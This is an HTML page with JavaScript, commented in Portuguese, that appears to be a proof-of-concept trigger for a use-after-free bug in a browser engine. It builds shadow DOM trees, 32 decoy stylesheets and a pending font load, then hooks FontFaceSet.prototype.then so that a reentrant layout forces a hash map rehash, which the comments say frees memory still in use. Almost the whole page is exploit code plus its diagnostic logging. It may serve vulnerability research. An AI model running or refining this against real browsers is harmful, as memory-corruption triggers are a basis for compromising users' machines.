<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>UAF eaafed0 v3</title>
<style>
body{background:#111;color:#ccc;font-family:monospace;font-size:13px;padding:8px;margin:0}
h2{color:#8cf;font-size:14px;margin:0 0 6px}
.r{padding:2px 4px;border-bottom:1px solid #1a1a1a}
.ok{color:#4e4} .no{color:#e44} .wn{color:#ea4} .in{color:#48e}
#out{background:#0a0a0a;border:1px solid #333;padding:6px;min-height:50px}
</style>
</head>
<body>
<h2>UAF eaafed0 v3</h2>
<div id="out"><div class="r in">Script carregado</div></div>

<script>
// ONERROR PRIMEIRO — captura qualquer erro antes de tudo
window.onerror = function(msg, src, line) {
    addRow('ERRO JS linha ' + line + ': ' + msg, 'no');
    return true;
};

var FONT_FAMILY = 'SF' + Math.floor(Math.random() * 9999);
var FONT_URL    = 'nofont' + Date.now() + '.woff';
var DECOY_COUNT = 32;

function addRow(text, cls) {
    var d = document.createElement('div');
    d.className = 'r ' + (cls || 'in');
    d.textContent = text;
    document.getElementById('out').appendChild(d);
}

// --- verificar APIs basicas ---
function checkAPIs() {
    addRow('--- Verificando APIs ---');

    var ok = true;

    // FontFace
    addRow('FontFace: ' + (typeof FontFace !== 'undefined'),
           typeof FontFace !== 'undefined' ? 'ok' : 'no');
    if (typeof FontFace === 'undefined') ok = false;

    // FontFaceSet
    addRow('FontFaceSet: ' + (typeof FontFaceSet !== 'undefined'),
           typeof FontFaceSet !== 'undefined' ? 'ok' : 'no');
    if (typeof FontFaceSet === 'undefined') ok = false;

    // document.fonts
    addRow('document.fonts: ' + ('fonts' in document),
           'fonts' in document ? 'ok' : 'no');
    if (!('fonts' in document)) ok = false;

    // CSSStyleSheet constructor
    var cssOk = false;
    try { new CSSStyleSheet(); cssOk = true; } catch(e) { addRow('CSSStyleSheet err: ' + e, 'no'); }
    addRow('new CSSStyleSheet(): ' + cssOk, cssOk ? 'ok' : 'no');
    if (!cssOk) ok = false;

    // attachShadow (num div, nao em body)
    var shadowOk = false;
    try {
        var tmp = document.createElement('div');
        document.body.appendChild(tmp);
        var sr = tmp.attachShadow({ mode: 'open' });
        shadowOk = 'adoptedStyleSheets' in sr;
        tmp.remove();
    } catch(e) { addRow('attachShadow err: ' + e, 'no'); }
    addRow('attachShadow + adoptedStyleSheets: ' + shadowOk, shadowOk ? 'ok' : 'no');
    if (!shadowOk) ok = false;

    // FontFaceSet.prototype.then getter
    var getterOk = false;
    try {
        var orig = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
        var fired = false;
        Object.defineProperty(FontFaceSet.prototype, 'then', {
            configurable: true,
            get: function() { fired = true; return undefined; }
        });
        void document.fonts.then;
        // restaura
        if (orig) {
            Object.defineProperty(FontFaceSet.prototype, 'then', orig);
        } else {
            try { delete FontFaceSet.prototype.then; } catch(e2) {}
        }
        getterOk = fired;
    } catch(e) { addRow('getter test err: ' + e, 'no'); }
    addRow('FontFaceSet.prototype.then getter: ' + getterOk, getterOk ? 'ok' : 'no');
    if (!getterOk) ok = false;

    return ok;
}

// --- setup ---
function setup() {
    addRow('--- Setup ---');

    void document.fonts;

    var fontSheet = new CSSStyleSheet();
    fontSheet.replaceSync(
        '@font-face { font-family: ' + FONT_FAMILY +
        '; src: url("' + FONT_URL + '"); }'
    );
    addRow('fontSheet criado: @font-face ' + FONT_FAMILY, 'ok');

    var extraSheet = new CSSStyleSheet();
    extraSheet.replaceSync('.mk { color: green; }');

    var decoySheets = [];
    for (var i = 0; i < DECOY_COUNT; i++) {
        var ds = new CSSStyleSheet();
        ds.replaceSync('.d' + i + ' { color: rgb(' + i + ',1,2); }');
        decoySheets.push(ds);
    }
    addRow('decoySheets criados: ' + DECOY_COUNT, 'ok');

    // Shadow tree A — renderizada, usa a fonte
    var hostA = document.createElement('div');
    document.body.appendChild(hostA);
    var rootA = hostA.attachShadow({ mode: 'open' });
    rootA.adoptedStyleSheets = [fontSheet];
    var spanA = document.createElement('span');
    spanA.style.fontFamily = FONT_FAMILY;
    spanA.textContent = 'A';
    rootA.appendChild(spanA);
    addRow('Shadow tree A criado', 'ok');

    // Shadow tree B — tem <style> removivel
    var hostB = document.createElement('div');
    document.body.appendChild(hostB);
    var rootB = hostB.attachShadow({ mode: 'open' });
    var gadgetStyle = document.createElement('style');
    gadgetStyle.textContent = '.gadget { color: navy; }';
    rootB.appendChild(gadgetStyle);
    var wrapperB = document.createElement('div');
    var elementB = document.createElement('span');
    wrapperB.appendChild(elementB);
    rootB.appendChild(wrapperB);
    rootB.adoptedStyleSheets = [fontSheet, extraSheet];
    addRow('Shadow tree B criado', 'ok');

    // 32 decoys
    var decoyRoots = [];
    var decoyStyles = [];
    for (var j = 0; j < DECOY_COUNT; j++) {
        var dh = document.createElement('div');
        document.body.appendChild(dh);
        var dr = dh.attachShadow({ mode: 'open' });
        var dsEl = document.createElement('style');
        dsEl.textContent = '.dg' + j + ' { }';
        dr.appendChild(dsEl);
        dr.appendChild(document.createElement('div'));
        decoyRoots.push(dr);
        decoyStyles.push(dsEl);
    }
    addRow('32 decoys criados', 'ok');

    // Forca layout para construir todos os resolvers
    void document.body.offsetHeight;
    addRow('offsetHeight: resolvers construidos', 'ok');

    // Materializa document.fonts.ready
    void document.fonts.ready;
    addRow('document.fonts.ready materializado', 'ok');

    // Inicia carregamento — STATUS FICA "loading" SINCRONAMENTE
    document.fonts.load('24px ' + FONT_FAMILY, 'A');
    var st = document.fonts.status;
    addRow('document.fonts.status = ' + st, st === 'loading' ? 'ok' : 'wn');

    return {
        gadgetStyle:  gadgetStyle,
        elementB:     elementB,
        decoyRoots:   decoyRoots,
        decoyStyles:  decoyStyles,
        decoySheets:  decoySheets
    };
}

// --- trigger ---
function trigger(s) {
    addRow('--- Trigger ---');

    // Instala getter em FontFaceSet.prototype.then
    var orig = Object.getOwnPropertyDescriptor(FontFaceSet.prototype, 'then');
    var getterCount = 0;
    Object.defineProperty(FontFaceSet.prototype, 'then', {
        configurable: true,
        get: function() {
            getterCount++;
            addRow('>>> GETTER DISPAROU count=' + getterCount +
                   ' status=' + document.fonts.status, 'wn');
            // restaura para evitar loop
            if (orig) {
                Object.defineProperty(FontFaceSet.prototype, 'then', orig);
            } else {
                try { delete FontFaceSet.prototype.then; } catch(e) {}
            }
            // REENTRANCIA: reconstroi decoys → HashMap cresce → rehash → UAF
            void document.body.offsetHeight;
            addRow('  apos offsetHeight reentrante', 'wn');
            return undefined;
        }
    });
    addRow('Getter instalado. status=' + document.fonts.status, 'ok');

    // Invalida resolvers dos decoys
    for (var i = 0; i < s.decoyRoots.length; i++) {
        s.decoyRoots[i].adoptedStyleSheets = [s.decoySheets[i]];
        s.decoyStyles[i].remove();
    }
    s.gadgetStyle.remove();
    addRow('Decoys e gadgetStyle removidos', 'ok');

    // Flush
    void document.styleSheets.length;
    addRow('Flush via styleSheets.length', 'ok');

    // TRIGGER FINAL
    addRow('Disparando elementB.id = boom + offsetHeight...', 'wn');
    s.elementB.id = 'boom';
    void s.elementB.offsetHeight;

    addRow('Chegou apos trigger. Getter count=' + getterCount, 'in');
    addRow(getterCount > 0
        ? 'Getter disparou de forma ASYNC (sem crash esperado)'
        : 'Getter NAO disparou — revisar setup', 'wn');

    // Verificacao 500ms depois
    setTimeout(function() {
        addRow('500ms: getter count=' + getterCount +
               ' status=' + document.fonts.status, 'in');
        addRow('PASS — chegou sem crash', 'ok');
    }, 500);
}

// --- main ---
window.addEventListener('load', function() {
    try {
        addRow('window.load disparado', 'in');
        if (!checkAPIs()) {
            addRow('APIs insuficientes — abortando', 'no');
            return;
        }
        addRow('Todas APIs OK', 'ok');
        setTimeout(function() {
            try {
                var state = setup();
                // Trigger SINCRONO — fonte ainda em loading
                trigger(state);
            } catch(e) {
                addRow('ERRO em setup/trigger: ' + e, 'no');
            }
        }, 0);
    } catch(e) {
        addRow('ERRO em load: ' + e, 'no');
    }
});
</script>
</body>
</html>
